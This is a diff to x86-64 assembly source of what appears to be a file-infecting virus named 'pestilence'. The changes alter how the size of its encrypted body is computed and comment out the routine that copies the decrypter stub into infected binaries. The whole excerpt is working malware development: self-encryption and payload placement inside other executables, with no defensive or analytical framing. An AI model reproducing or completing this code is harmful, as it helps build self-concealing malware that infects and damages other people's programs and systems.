@@ -287,16 +287,17 @@ _copy_encrypt_zone:
 ; take the base addr to encrypt
 	lea rdi, [rel _encrypted_part_start]
 ; calculate the size to encrypt
-	lea rsi, [rel _final_end] ; take the end addr to encrypt
-	add rsi, 2
+	lea rsi, [rel _padding]
+;	lea rsi, [rel _final_end] ; take the end addr to encrypt
+;	add rsi, 2
 	sub rsi, rdi ; calculate the size to encrypt
 ; take the addr to store the encrypted part
 	mov rdx, QWORD [rsp + 108] ; mmap addr
 	add rdx, QWORD [rsp + 116] ; offset
 	call _encrypt_zone
 	mov QWORD [rsp + 132], rax ; take the key addr the function returned
-	lea rsi, [rel _final_end]
-	add rsi, 2
+	lea rsi, [rel _padding]
+;	add rsi, 2
 	lea r10, [rel _encrypted_part_start]
 	sub rsi, r10
 	add QWORD [rsp + 116], rsi
@@ -312,30 +313,30 @@ _copy_key:
 	add QWORD [rsp + 116], 256
 
 ; The decrypter addr offset is different from pestilence base binary to encrypted binaries so:
-_copy_depacker:
+;_copy_depacker:
 ;; memcpy(mmap_tmp + index, decrypt, decrypt_size)
-	lea rax, [rel _o_entry]
-	cmp QWORD [rax], 0
-	je _base_binary
+;	lea rax, [rel _o_entry]
+;	cmp QWORD [rax], 0
+;	je _base_binary
 
-_infected_binary:
+;_infected_binary:
 ; In infected binaries, the depacker is at offset _final_end + 258
-	mov rdi, QWORD [rsp + 108]
-	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _decrypt]
-	lea rcx, [rel _end_decrypt]
-	add rcx, 2
-	sub rcx, rsi
-	lea rsi, [rel _final_end]
-	add rsi, 258
-	cld
-	rep movsb
-	lea rsi, [rel _decrypt]
-	lea rcx, [rel _end_decrypt]
-	add rcx, 2
-	sub rcx, rsi
-	add QWORD [rsp + 116], rcx
-	jmp _align_to_page_size
+;	mov rdi, QWORD [rsp + 108]
+;	add rdi, QWORD [rsp + 116]
+;	lea rsi, [rel _decrypt]
+;	lea rcx, [rel _end_decrypt]
+;	add rcx, 2
+;	sub rcx, rsi
+;	lea rsi, [rel _final_end]
+;	add rsi, 258
+;	cld
+;	rep movsb
+;	lea rsi, [rel _decrypt]
+;	lea rcx, [rel _end_decrypt]
+;	add rcx, 2
+;	sub rcx, rsi
+;	add QWORD [rsp + 116], rcx
+;	jmp _align_to_page_size
 
 _base_binary:
 ; In base pestilence binary, depacker is at offset _final_end + padding
